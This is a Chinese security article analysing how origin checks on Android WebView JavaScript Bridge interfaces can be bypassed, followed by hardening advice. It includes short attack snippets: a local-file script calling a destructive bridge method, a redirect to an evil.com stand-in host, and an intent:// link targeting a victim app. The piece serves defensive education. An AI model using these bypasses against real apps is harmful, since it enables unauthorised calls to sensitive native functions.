# Andorid JSB基于来源校验的防护绕过分析-先知社区

> **来源**: https://xz.aliyun.com/news/17002  
> **文章ID**: 17002

---

## 引言

在移动混合开发中，JavaScript Bridge（JSB）作为连接Web与原生代码的核心组件，极大提升了开发效率，但同时也引入了显著的安全风险。攻击者可能通过JSB漏洞越权调用敏感API，导致数据泄露、恶意操作等严重后果。通常情况下会通过校验调用jsb接口的访问来源网页来进行防护，而该防护在大多情况下仍会存在绕过，本文将分析此类风险及提出更安全的加固方案

## JSB工作原理与攻击面

JSB通过WebView在JavaScript与原生代码（Java/Kotlin/Swift）间建立通信通道，典型实现方式包括：

* **Android**：使用@JavascriptInterface注解暴露Java方法。
* **iOS**：通过WKScriptMessageHandler注册消息处理器。

**风险场景示例**：

```
// Web端恶意代码
window.NativeBridge.execute("deleteUser", {userId: "123"});
```

若原生层未做权限校验，攻击者可直接触发高危操作。

## **可信域名校验的核心逻辑**

在JSB通信中，开发者通常通过校验WebView加载页面的域名或URL来确保请求来源的合法性，这是防御恶意调用的一线屏障

**Android示例（校验加载****URL****的域名）**：

```
webView.setWebViewClient(new WebViewClient() {
    @Override
    public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
        String url = request.getUrl().toString();
        // 校验域名白名单
        if (!isTrustedDomain(url)) {
            Log.e("Security", "Blocked untrusted domain: " + url);
            return true; // 阻止加载
        }
        return super.shouldOverrideUrlLoading(view, request);
    }

    private boolean isTrustedDomain(String url) {
        Uri uri = Uri.parse(url);
        List<String> allowedDomains = Arrays.asList("www.example.com", "api.trusted.org");
        return allowedDomains.contains(uri.getHost());
    }
});
```

## **绕过来源校验的攻击手法**

尽管域名校验是基础防护手段，但攻击者仍可通过多种方式绕过限制：

### **WebView协议漏洞利用**

**攻击场景**： 利用file://、content://等本地协议加载恶意HTML文件，绕过远程域名校验。

**Android漏洞代码**：

```
// 错误配置：允许加载本地文件
webView.getSettings().setAllowFileAccess(true);
```

**攻击****Payload**：

```
<!-- 恶意本地文件 -->
<script>
window.NativeBridge.deleteAllData(); // 直接调用高危接口
</script>
```

**绕过原理**： 当WebView加载file:///sdcard/evil.html时，url.getHost()返回null，白名单校验可能被绕过。

### **跨域重定向劫持**

**攻击场景**： 在可信域名页面中注入恶意重定向代码，跳转到攻击者控制的域名。

**恶意****JavaScript****代码**：

```
// 在合法页面中注入
setTimeout(() => {
    window.location.href = "http://evil.com?redirect_back=1";
}, 3000);
```

或者是找到一个可信白名单下URL重定向漏洞，然后重定向到上述的恶意的payload中

**绕过原理**： 部分校验逻辑仅在页面初始加载时检查URL，未监控后续重定向行为。

### **Intent Scheme攻击**

**攻击场景**： 通过自定义Intent Scheme触发WebView加载恶意内容。

**攻击****Payload**：

```
<!-- 通过外部链接触发 -->
<a href="intent://evil.com#Intent;package=com.victim.app;scheme=https;end"> 
    Click to Launch App
</a>
```

**绕过原理**： 若应用未正确处理Intent的data字段，可能将evil.com解析为合法来源。

### **WebView调试漏洞**

**攻击场景**： 启用WebView调试模式时，攻击者通过Chrome DevTools注入恶意代码。

**漏洞配置**：

```
// Android开启调试模式（生产环境未关闭）
WebView.setWebContentsDebuggingEnabled(true);
```

**绕过原理**： 攻击者直接通过chrome://inspect远程控制WebView，完全绕过域名限制。

## **加固来源校验方案**

### **协议与路径深度校验**

通过协议+具体到路径，进一步收敛能够调用JSB的风险暴露面

```
// Android扩展校验逻辑
private boolean isTrustedSource(String url) {
    Uri uri = Uri.parse(url);
    // 禁止本地协议
    if ("file".equals(uri.getScheme()) || "content".equals(uri.getScheme())) {
        return false;
    }
    // 校验完整路径（非仅域名）
    return uri.toString().startsWith("https://www.example.com/valid-path/");
}
```

### **动态Token绑定（防御重定向攻击）**

**实现逻辑**： 在合法页面加载时，原生层向Web注入动态Token，后续接口调用需携带该Token。

**Android示例**：

```
// 页面加载完成后注入Token
webView.setWebViewClient(new WebViewClient() {
    @Override
    public void onPageFinished(WebView view, String url) {
        String token = TokenGenerator.generate(); // 动态生成
        view.evaluateJavascript("window.APP_TOKEN = '" + token + "';", null);
    }
});

// JSB接口校验Token
@JavascriptInterface
public void sensitiveOperation(String params, String token) {
    if (!TokenValidator.validate(token)) {
        throw new SecurityException("Invalid token");
    }
    // 执行操作
}
```

## **思考与总结**

**来源校验的局限性**：

* **无法防御同源****XSS****攻击**：若合法域名存在XSS漏洞，攻击者仍可在可信上下文中调用JSB。
* **依赖客户端环境**：所有校验逻辑均在客户端执行，可能被逆向工程绕过。

**纵深防御建议**：

1. **服务端参与鉴权**：关键操作需向服务端发起二次验证。
2. **运行时环境检测**：通过BuildConfig、Signature等判断是否为正式环境。
3. **代码混淆加固**：使用ProGuard、R8等工具混淆JSB接口类名。

**​**

**终极防护原则**： **永远不要信任Web层传递的任何数据**，即便来源“合法”也需实施完备的输入验证、权限控制与操作审计
